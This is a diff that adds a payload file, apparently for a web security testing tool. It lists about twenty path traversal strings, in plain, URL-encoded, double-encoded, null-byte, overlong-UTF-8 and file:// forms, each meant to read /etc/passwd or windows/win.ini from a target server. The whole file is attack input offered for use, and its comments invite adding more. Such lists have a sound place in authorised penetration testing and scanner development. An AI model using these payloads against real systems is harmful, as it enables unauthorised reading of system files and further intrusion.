@@ -1,0 +1,25 @@
+# Path Traversal payloads — inject to read local files (Linux /etc/passwd + Windows).
+# One payload per line. Lines starting with # are ignored.
+# Add your own freely; the tool loads every non-comment line.
+../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+../../../../../../etc/passwd%00
+....//....//....//....//etc/passwd
+..//..//..//..//..//..//etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252f..%252fetc%252fpasswd
+%252e%252e%252fetc%252fpasswd
+/etc/passwd
+/etc/passwd%00
+....\\....\\....\\etc\\passwd
+..\\..\\..\\..\\..\\..\\windows\\win.ini
+..%5c..%5c..%5c..%5cwindows%5cwin.ini
+../../../../../../windows/win.ini
+%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
+C:\\windows\\win.ini
+/../../../../../../../../etc/passwd
+....//....//....//etc//passwd
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+file:///etc/passwd
